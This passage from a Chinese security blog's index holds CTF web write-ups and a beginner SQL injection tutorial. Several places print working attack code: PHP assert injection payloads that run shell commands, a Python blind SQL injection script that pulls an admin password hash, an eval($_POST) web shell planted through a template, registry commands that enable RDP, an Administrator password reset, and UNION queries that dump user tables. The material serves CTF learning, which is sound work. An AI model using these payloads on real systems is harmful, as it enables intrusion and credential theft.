<p>这题环环相扣，漏掉一点都无法继续，也有很多多余的杂乱信息。<br>从分析页面到getshell，可以说是比较现实的WEB渗透了。<br>对后门我也是只懂皮毛….贴上找到的知识贴——<a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html" target="_blank" rel="external">关于各种后门</a><br>放上自己的注入代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">爆破账号密码：</div><div class="line">soid=chacharr(49)/**/anandd/**/(seselectlect/**/ascii(substring(userpaspasss,1,1))/**/ffromrom/**/aadmindmin)&lt;&gt;1</div></pre></td></tr></table></figure></p>
<p><strong>Q&amp;A</strong></p>
<p>遍历后的出现目录的页面 乱码 ：下载页面，到sublime中换编译方式打开即可</p>
<hr>
<p>还有好长的路呢…..慢慢学习嗯</p>
<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p><a href="http://web.jarvisoj.com:32798/" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="git信息泄露-hackgit-php字符串拼接注入"><a href="#git信息泄露-hackgit-php字符串拼接注入" class="headerlink" title=".git信息泄露 hackgit php字符串拼接注入"></a>.git信息泄露 hackgit php字符串拼接注入</h3><p>全程知识盲区…<br>about页面得知用到git<br><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/" target="_blank" rel="external">git</a>的配置不当有可能导致.git信息泄露,漏洞表现：</p>
<ul>
<li>可以查看  .git  .git/objects</li>
<li>可以下载  .git/index<br>利用<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">githack</a>尝试下载源码，有一些php,找到目标<strong>flag.php</strong></li>
</ul>
<p>index.php其中关键源码：<br>‘’’php<br>&lt;?php<br>if (isset($_GET[‘page’])) {<br>    $page = $_GET[‘page’];<br>} else {<br>    $page = “home”;<br>}<br>$file = “templates/“ . $page . “.php”;<br>assert(“strpos(‘$file’, ‘..’) === false”) or die(“Detected hacking attempt!”);<br>assert(“file_exists(‘$file’)”) or die(“That file doesn’t exist!”);<br>?&gt;<br>‘’’</p>
<p>咋一看并没有什么软用，但是</p>
<ul>
<li>可以控制$page的值</li>
<li>php神奇的特性，字符串链接命令，命令可以执行<br><a href="http://ww1.sinaimg.cn/large/006iKNp3gy1fkfmrveqtej30l002dt8j.jpg" target="_blank" rel="external">字符串链接</a></li>
<li>与sql注入原理相同的php拼接写入代码</li>
</ul>
<p>payload(为了清楚，变量不写””):<br>‘’’php<br>$page = ‘.system(“ls ./templates”).’   ;<br>$file(合并后) = templates/‘.system(“ls ./templates”).’..php   ;<br>assert(“strpos(‘templates/.’ . system(“ls ./templates”) .  ‘..php’ , ‘..’ ) === false”)<br>‘’’<br>由于assert函数，会把””中的语句当做php代码执行，所以可以在其中用<strong>//</strong>注释””后面乱七八糟的语句，自己构筑代码<br>所以给出另一个payload<br>‘’’php<br>$page = ‘, ‘..’) === false and system(‘cat ./templates/flag.php’);    //   ;<br>$file(合并后) = templates/‘, ‘..’) === false and system(‘cat ./templates/flag.php’);    //.php   ;<br>assert(  “strpos(‘templates/‘ , ‘..’) === false  and  system(‘cat ./templates/flag.php’);    //.php’, ‘..’ ) === false”  );<br>‘’’<br>两种payload都可以在<code>system(&quot; &quot;)</code>中可以执行任意linux命令<br>flag.php返回需要查看源码才能看到…….嗯..绝望卡了两年</p>
<h2 id="俄罗斯方块"><a href="#俄罗斯方块" class="headerlink" title="俄罗斯方块"></a>俄罗斯方块</h2><p><a href="http://web.jarvisoj.com:32798/" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="js代码-jsFuck"><a href="#js代码-jsFuck" class="headerlink" title="js代码 jsFuck"></a>js代码 jsFuck</h3><p>一开始推断是到分数有服务器返回什么，抓包尝试修改无效。<br>源码找到<strong>tetris.js</strong><br><a href="http://tool.oschina.net/codeformat/js/" target="_blank" rel="external">js代码格式化</a>后阅读代码，找到关键代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.mayAdd = function(a) &#123;</div><div class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.scores.length &lt; <span class="keyword">this</span>.maxscores) <span class="keyword">return</span> <span class="number">1E6</span> &lt; a &amp;&amp; (a = <span class="keyword">new</span> p, a.set(<span class="string">"urlkey"</span>, <span class="string">"webqwer"</span> [<span class="number">1</span>] + <span class="string">"100.js"</span>, <span class="number">864E5</span>)),</div><div class="line">            !<span class="number">0</span>;</div><div class="line">            <span class="keyword">for</span> (var b = <span class="keyword">this</span>.scores.length - <span class="number">1</span>; <span class="number">0</span> &lt;= b; --b) <span class="keyword">if</span> (<span class="keyword">this</span>.scores[b].score &lt; a) <span class="keyword">return</span> <span class="number">1E6</span> &lt; a &amp;&amp; (a = <span class="keyword">new</span> p, a.set(<span class="string">"urlkey"</span>, <span class="string">"webqwer"</span> [<span class="number">1</span>] + <span class="string">"100.js"</span>, <span class="number">864E5</span>)),</div><div class="line">            !<span class="number">0</span>;</div><div class="line">            <span class="keyword">return</span> ! <span class="number">1</span></div><div class="line">        &#125;;</div></pre></td></tr></table></figure></p>
<p>如果满足<strong>1E6 &lt; a</strong>执行<code>a.set(&quot;urlkey&quot;, &quot;webqwer&quot; [1] + &quot;100.js&quot;, 864E5)</code><br>此处传入三个参数<strong>“urlkey”</strong>，<strong>“e100.js”</strong>,<strong>864ES</strong><br>查看set函数<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.set = function(b, d, a, c, e, f) &#123;</div><div class="line">           <span class="keyword">this</span>.del(b);</div><div class="line">           c || (c = <span class="string">"/"</span>);</div><div class="line">           b = b + <span class="string">"="</span> + escape(d);</div><div class="line">           a &amp;&amp; (a = <span class="keyword">new</span> Date((<span class="keyword">new</span> Date).getTime() + <span class="number">1E3</span> * a), b += <span class="string">"; expires="</span> + a.toGMTString());</div><div class="line">           b = b + (c ? <span class="string">";\tpath="</span> + c: <span class="string">""</span>) + (e ? <span class="string">";\tdomain="</span> + e: <span class="string">""</span>);</div><div class="line">           b += f ? <span class="string">";\tsecure"</span>: <span class="string">""</span>;</div><div class="line">           document.cookie = b</div><div class="line">       &#125;;</div></pre></td></tr></table></figure></p>
<p>发现函数应该是传入5个参数，有问题。<br>一个坑，其实三个参数只是提示，并不是可以执行的。<br>urlkey —&gt; url地址访问e100.js    864ES忽略<br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fkkabybwmlj30ej04jmx3.jpg" alt="jsfuck"><br>jsfuck编码，<a href="http://www.bugku.com/tools/jsfuck/#" target="_blank" rel="external">这里</a><br>得到flag</p>
<h2 id="全球某工商CTF-安全系的博客"><a href="#全球某工商CTF-安全系的博客" class="headerlink" title="全球某工商CTF-安全系的博客"></a>全球某工商CTF-安全系的博客</h2><p><a href="http://10.21.13.225/zn" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="后台-伪验证-sql注入-登录-模板注入攻击-菜刀"><a href="#后台-伪验证-sql注入-登录-模板注入攻击-菜刀" class="headerlink" title="后台 伪验证 sql注入 登录 模板注入攻击 菜刀"></a>后台 伪验证 sql注入 登录 模板注入攻击 菜刀</h3><p>很厉害的一个网页，随便点点没什么发现。<br>右键源码一个个看，没什么发现。<br>上工具<strong>SourceLeakHacker</strong>跑目录</p>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fkkbpkw17oj30gq0ag0ts.jpg" alt="跑目录"><br></div><br>先尝试访问<strong>200</strong>（正确返回），没有可用信息<br>再尝试访问<strong>303</strong>（跳转），找到<strong>/admin</strong>跳转至后台登录界面<strong>/admin-sign</strong><br>随意试着登录，有逐层递进四种返回状态：<br>+ <strong>参数不能为空！</strong>：判断参数是否为空<br>+ <strong>验证码不正确！</strong>：判断验证码<br>+ <strong>用户名不存在！</strong>：判断用户名是否存在<br>+ <strong>用户认证失败！</strong>：判断密码是否正确<br>先要解决验证码问题，抓包发现，发送账号密码验证码等信息后会再发一个请求包，来修改验证码图片<br><div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fkkc8whxcrj30dn06ymxl.jpg" alt="验证码包"><br></div>

<p>丢弃这个包，验证码不再发生变化，等于绕过了验证<br>尝试<strong>sql注入</strong><br>在用户名处发现注入点<br><code>admin&#39; and &#39;1&#39;=&#39;1</code> 返回 用户认证失败<br><code>admin&#39; and &#39;1&#39;=&#39;2</code> 返回 用户名不存在<br>ps.关于解码/u 在返回包中有写着charset=UTF-8，在python中<code>urllib.unquote(b)</code>即可<br>boolean型盲注password，给出脚本代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"></div><div class="line">url=<span class="string">"http://10.21.13.225/admin-sign/login"</span></div><div class="line"></div><div class="line">payloads=<span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM,./;'[]\_@!#$%^&amp;*()-=+~`[];'./"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#判断列</span></div><div class="line">sql_column=<span class="string">"admin' and column is not null--+"</span>  <span class="comment">#替换column  得到 password</span></div><div class="line"><span class="comment">#列出password</span></div><div class="line">sql=<span class="string">"admin'  and  ascii(substring(password,%s,1))=%s-- "</span></div><div class="line"></div><div class="line">cookies = dict(ci_session=<span class="string">'b9de57e065184832d04df4c4aa18242f13e04d89'</span>)</div><div class="line"><span class="comment">#headers = &#123;"Content-Type": "application/x-www-form-urlencoded"&#125;</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></div><div class="line">	data=&#123;<span class="string">'username'</span>:sql %(i,x),<span class="string">'password'</span>:<span class="string">'21232f297a57a5a743894a0e4a801fc3'</span>,<span class="string">'verify'</span>:<span class="string">'学商商浙浙商'</span>&#125;</div><div class="line">	response=requests.post(url,cookies=cookies,data=data)</div><div class="line">	<span class="comment">#print response.content</span></div><div class="line">	<span class="keyword">if</span>  response.text.find(<span class="string">'\u8ba4'</span>) != <span class="number">-1</span>:</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">else</span> :</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line"></div><div class="line"></div><div class="line">key=<span class="string">''</span></div><div class="line">print(<span class="string">'start'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">59</span>):</div><div class="line">	<span class="keyword">print</span> i</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">30</span>,<span class="number">151</span>):</div><div class="line">		<span class="keyword">if</span> exp(i,x)==<span class="number">1</span> :</div><div class="line">			key += chr(x)</div><div class="line">			print(key)</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<p>得到admin的密码MD5为1c63129ae9db9c60c3e8aa94d3e00495<br>直接登录到后台。<br>发现修改语言里面的东西没有权限。<br>发现有管理员账号<strong>orleven</strong>，<strong>平行越权</strong>修改管理员密码。<br> <strong>平行越权</strong>：设置-修改密码，抓包修改admin为orleven。<br>登录进入中文的编辑语言界面。（如果选英文的需要设置为启动，不然之后菜刀连接不上界面）<br>尝试<strong>模板注入漏洞</strong>，后尾加入<code>&quot;;phpinfo();&quot;</code>闭合前后引号<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fkke2fr6sjj30v30jhjtq.jpg" alt=""><br>页面变化，说明修改了代码可以执行<br>再加入菜刀php木马<code>&quot;;@eval($_POST[&#39;Cknife&#39;]);&quot;</code><br>连上菜刀</p>
<p><div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fkkecje92vj30ci06oq2v.jpg" alt=""><br></div><br>可以直接在桌面上找到flag<br>或者继续：</p>
<p>切换到菜刀终端模式，开启远程连接3389端口<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">删除注册表</div><div class="line">reg delete <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /f</div><div class="line">添加注册表</div><div class="line">reg add <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</div></pre></td></tr></table></figure></p>
<p>修改密码<code>net user Administrator (复杂的密码)</code><br>打开远程桌面连接，账号administrator 密码<br>桌面上得到flag</p>
]]></content>
      
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WEB-CTF中的SQL注入]]></title>
      <url>/2017/08/29/WEB-CTF%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<p>—从零开始的笔记—</p>
<a id="more"></a>
<p>从最最基础的开始=.= start</p>
<h2 id="SQL注入的基本原理"><a href="#SQL注入的基本原理" class="headerlink" title="SQL注入的基本原理"></a>SQL注入的基本原理</h2><p>  你提交的<strong>任何内容</strong>都会被服务器放入sql语句中执行,于是可以构筑自己的sql语句在服务器端执行。<br>  当然以上所说的是在服务器完全没有防御的情况下，通常都不会这么简单，但是原理是相同。</p>
<h2 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h2><ul>
<li>根据注入点(既我们提交内容的位置)情况的不同分为两种：<ul>
<li>字符型注入: 提交的内容<strong>会</strong>在服务端处左右会被加上’‘</li>
<li>数字型注入: 提交的内容<strong>不会</strong>在服务端处加上’‘<br>以上两种注入的区别在于：字符型注入需要用各种方法闭合单引号,屏蔽单引号等，而数字型注入不用，即数字型相对简单。</li>
</ul>
</li>
<li>根据对于注入结果服务端会显示给攻击者与否分两种：<ul>
<li>有回显的sql注入：有显示查询结果或错误信息</li>
<li>sql盲注：没有显示直接结果或错误。但仍然由办法提取信息，sql盲注较为复杂又分为<strong>布尔型盲注</strong>和<strong>时间型盲注入</strong><ul>
<li>布尔型盲注：返回状态只有两种情况，通常为有显示true和无显示false，借此来判断是否成功。</li>
<li>时间型盲注：返回状态没有任何区别，若成功人为制造延迟时间延迟，以此来判断是否成功。<br>此篇会详细介绍有回显的sql注入，sql盲注另开一篇</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="简单的了解数据库的结构"><a href="#简单的了解数据库的结构" class="headerlink" title="简单的了解数据库的结构"></a>简单的了解数据库的结构</h2><p>  数据库 &gt; 表 &gt; 列<br>  数据库中的库名，表名，列名等基本信息会存储在information_schema这个数据库中tables，columns的表内。</p>
<table>
<thead>
<tr>
<th style="text-align:center">%</th>
<th style="text-align:center">数据库</th>
<th style="text-align:center">表</th>
<th style="text-align:center">列 </th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">  英文</td>
<td style="text-align:center">schema</td>
<td style="text-align:center">table</td>
<td style="text-align:center">column</td>
</tr>
<tr>
<td style="text-align:center">  信息库中的列名</td>
<td style="text-align:center">table_schema</td>
<td style="text-align:center">table_name</td>
<td style="text-align:center">column_name</td>
</tr>
</tbody>
</table>
<h2 id="字符型SQL注入的步骤"><a href="#字符型SQL注入的步骤" class="headerlink" title="字符型SQL注入的步骤"></a>字符型SQL注入的步骤</h2><p>  首先sql注入的<strong>核心</strong>就是去探测收集服务器的信息，再<strong>推测判断服务器sql语句</strong>的构成，再加以利用得到自己想要的数据即FLAG。</p>
<p>  以下以<strong>最基础的字符型注入</strong>为例，为了方便理解，服务端的sql语句以下为例<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select 列 from 数据库.表 <span class="built_in">where</span> name=<span class="string">'$name'</span></div></pre></td></tr></table></figure></p>
<h3 id="1-判断是否有SQL注入点"><a href="#1-判断是否有SQL注入点" class="headerlink" title="1.判断是否有SQL注入点"></a>1.判断是否有SQL注入点</h3><p>判断sql注入点：服务器会对我们除了正常输入以外的测试语句有反应</p>
<ul>
<li>报错</li>
<li>可以影响到查询结果</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>= 1<span class="string">' and '</span>1<span class="string">' = '</span>1    (前后闭合’‘，此处应该返回正确的页面，即与<span class="variable">$name</span>=1一样)</div><div class="line"></div><div class="line"><span class="variable">$name</span>= 1<span class="string">' and '</span>1<span class="string">' = '</span>2    (前后闭合’‘, 此处应该返回数据库错误的信息，即与<span class="variable">$name</span>=1不同)</div><div class="line"></div><div class="line">全句：select 列 from 表 <span class="built_in">where</span> name = <span class="string">'1'</span> and <span class="string">'1'</span>=<span class="string">'1'</span></div></pre></td></tr></table></figure>
<p>在确认有注入漏洞之后，探测sql语句组成</p>
<h3 id="2-判断select语句中有几列"><a href="#2-判断select语句中有几列" class="headerlink" title="2.判断select语句中有几列"></a>2.判断select语句中有几列</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>=1<span class="string">' order by 数字n --+  （--+ 为url编码后的 --(空格) 是注释符，用于屏蔽后面的‘）</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全句：select 列 from 表 where name = '</span><span class="string">' order by 数字n -- ’</span></div></pre></td></tr></table></figure>
<blockquote>
<p><a href="http://www.w3school.com.cn/sql/sql_orderby.asp" target="_blank" rel="external">order by</a> 列名  （列名可以为select语句中列的序号,name,age——-&gt;1,2）</p>
</blockquote>
<p>因此数字从大往小猜，如果超出它的列数，则报错；如果恰好等于列数，显示$name=1的结果</p>
<p>假设结果 n=2 列</p>
<h3 id="3-判断显示的信息是第几列的信息"><a href="#3-判断显示的信息是第几列的信息" class="headerlink" title="3.判断显示的信息是第几列的信息"></a>3.判断显示的信息是第几列的信息</h3><p>一般在我们可见页面中显示的信息不一定是查询全部列数，可能查询3列，显示1列。<br>通过‘直接闭合前面的select语句，使其前半句查询结果空(除非存在name=’‘的情况)<br>union select 1,2 通过显示的数字来确定显示的列的位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$name=&apos; union select 1,2 --+</div><div class="line"></div><div class="line">全句：select n列 from 表 where name = &apos;&apos; union select 1,2 -- &apos;</div></pre></td></tr></table></figure></p>
<p>假设得到 2 ，以后想要查询的信息就放在第二个列处</p>
<h3 id="4-利用函数来收集信息"><a href="#4-利用函数来收集信息" class="headerlink" title="4.利用函数来收集信息"></a>4.利用函数来收集信息</h3><p>查询sql自带的函数来确定当前用户，当前数据库等信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">用户：user()</div><div class="line">当前数据库：database()</div><div class="line">数据库版本：version()</div><div class="line">@@hostname （用户）</div><div class="line">@@datadir   (数据库在文件的位置)</div><div class="line">@@version  （版本)</div><div class="line">@@version_compile_OS  (操作系统版本)</div><div class="line"></div><div class="line"><span class="variable">$name</span>=<span class="string">' union select 1,user() --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全局：select 2列 from 表 where name = '</span><span class="string">' union select 1,user() -- '</span></div></pre></td></tr></table></figure></p>
<p>如果为root用户，就可以访问information_schema数据库</p>
<h3 id="5-通过-union-查询数据库"><a href="#5-通过-union-查询数据库" class="headerlink" title="5.通过 union 查询数据库"></a>5.通过 union 查询数据库</h3><p>  通过<strong>information_schema数据库</strong>中的tables，columns来查询目标的数据库，表，列<br>  再直接查询内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">查询数据库</div><div class="line"><span class="variable">$name</span>=<span class="string">' union select 1,table_schema from information_schema.tables --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">查询数据库中有多少个表</span></div><div class="line"><span class="string">$name='</span> union select table_schema,count(*) from information_schema.tables --+</div><div class="line"></div><div class="line">查询指定数据库中的表名</div><div class="line"><span class="variable">$name</span>=<span class="string">' union select 1,table_name from information_schema.tables where table_schema='</span>dvwa<span class="string">' --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">查询指定数据库指定表中的列名</span></div><div class="line"><span class="string">$name='</span> union select table_name,column_name from information_schema.columns <span class="built_in">where</span> table_schema=<span class="string">'dvwa'</span> and table_name=<span class="string">'users'</span>--+</div><div class="line"></div><div class="line">查询指定数据库指定表的列的内容</div><div class="line"><span class="variable">$name</span>=<span class="string">' union select user,password from dvwa.users --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">查询链接显示</span></div><div class="line"><span class="string">$name='</span> union select null,concat_ws(<span class="string">' : '</span>,user,password) from dvwa.users --(空格)</div><div class="line"><span class="variable">$name</span>=<span class="string">' union select null,concat(user,'</span> : <span class="string">',password) from dvwa.users --(空格)</span></div><div class="line"><span class="string">ps. '</span>:<span class="string">' 编码---&gt; 0x3a</span></div></pre></td></tr></table></figure></p>
<h3 id="6-无权限时，猜解列名，表名，库名"><a href="#6-无权限时，猜解列名，表名，库名" class="headerlink" title="6.无权限时，猜解列名，表名，库名"></a>6.无权限时，猜解列名，表名，库名</h3><p>  当前用户不是root用户，就无权访问information_schema库<br>  只能通过返回页面的两种状态判断是否猜解正确，其原理跟布尔型sql盲注一致<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line"><span class="variable">$name</span>=<span class="string">' and column is null --+    </span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全句：select 2列 from 表 where name = '</span><span class="string">' and column is null -- '</span></div></pre></td></tr></table></figure></p>
<p>用字典文件替换column，如果不存在此列，有错误；存在此列，无返回(类似来判断，下同)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">2.猜解当前表名------已猜出列名</div><div class="line"><span class="variable">$name</span>=<span class="string">' and table.user is null --+	</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">3.猜解当前数据库名--已猜出列名，表名</span></div><div class="line"><span class="string">$name='</span> and db.table.user is null --+</div><div class="line"></div><div class="line">4.猜解当前数据库的其他表</div><div class="line"><span class="variable">$name</span>=<span class="string">' and (select count(*) from table)&gt;0 --+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</span></div></pre></td></tr></table></figure></p>
<p>在猜解到你所要的库，表，列之后可以直接union select 查询</p>
<h2 id="数字型SQL注入"><a href="#数字型SQL注入" class="headerlink" title="数字型SQL注入"></a>数字型SQL注入</h2><p>数字型注入和字符型注入原理相同，但更为简单。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>=1 and 1=1 <span class="comment">#</span></div></pre></td></tr></table></figure></p>
<p>区别：</p>
<ul>
<li>不用考虑 ’ 闭合问题</li>
<li>输入字符’a’时  把需要的字符串变为Ox16进制 </li>
</ul>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>以上就可以通过sql注入漏洞，查询到数据库的信息。<br>另外，还可以通过数据库进行—-&gt;sql文件操作<br>但是实际情况下：<br>服务器会过滤限制我们的输入，这就关系到—-&gt;sql过滤<br>服务器不显示查询信息和错误信息，需要—-&gt;<a href="https://lalajun.github.io/2017/09/24/WEB-CTF%E4%B8%AD%E7%9A%84sql%E7%9B%B2%E6%B3%A8/#more" target="_blank" rel="external">sql盲注</a></p>
<h2 id="数据库函数"><a href="#数据库函数" class="headerlink" title="数据库函数"></a>数据库函数</h2><ul>
<li>char（）—-&gt; ASCII码 变为 字符</li>
<li><a href="http://www.bubuko.com/infodetail-455153.html" target="_blank" rel="external">group_cat（) 和 group_concat</a> —–&gt; 用分隔符链接字符串；可以多个结果合并提高效率</li>
<li><a href="http://www.yiibai.com/sql/sql_function_substring_index.html" target="_blank" rel="external">substring_index()</a>  —–&gt; 分割字符串提取自己想要查看的</li>
<li><a href="http://www.w3school.com.cn/sql/sql_func_mid.asp" target="_blank" rel="external">mid(String,n,n)</a>——&gt;截取字符串</li>
<li><a href="https://www.lvtao.net/study_doc/mysql/mysql_function_oct_str.html" target="_blank" rel="external">ord()</a> ——-&gt;字符变为ASCII码， 一个字节字符直接变ASCII，多字节字符相连ASCII<br>ord() <strong>&amp;</strong> 128 或 64 或 32 或 16 或 8 ……1 来判断分割多个字符</li>
<li>and 前面语句<strong>出错</strong>后面语句不执行   </li>
<li>or  前面语句<strong>正确</strong>后面语句不执行</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
